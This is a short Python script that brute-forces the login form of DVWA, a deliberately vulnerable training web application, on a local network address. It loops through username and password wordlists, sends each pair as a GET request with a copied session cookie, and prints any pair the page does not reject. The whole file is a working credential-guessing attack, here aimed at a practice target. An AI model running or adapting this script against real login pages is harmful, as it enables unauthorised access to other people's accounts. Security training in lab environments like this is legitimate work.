import requests

# login in manually from the browser into DVWA and copy these cookies
# we need them because we want requests to access a page which requires having logged in
cookies = {'PHPSESSID' : 'c477209fa2de651352e71c3c44f96999', 'security' : 'low'}

nome_utente = []
passwords = []

with open('usernames.txt','r') as username:
	nome_utente = username.read().splitlines()
		
with open('passwords.txt','r') as password:
	passwords = password.read().splitlines()
	
for n in nome_utente:
    for p in passwords:
        url = '' 
        url += 'http://192.168.1.167/dvwa/vulnerabilities/brute/?'
        url += 'username=' + n
        url += '&password=' +p
        url += '&Login=Login'
			
        req = requests.get(url, cookies=cookies)
			
        if (b'incorrect' not in req.content):
            print(req.url)
            print('username=' + n +', password=' + p)
			
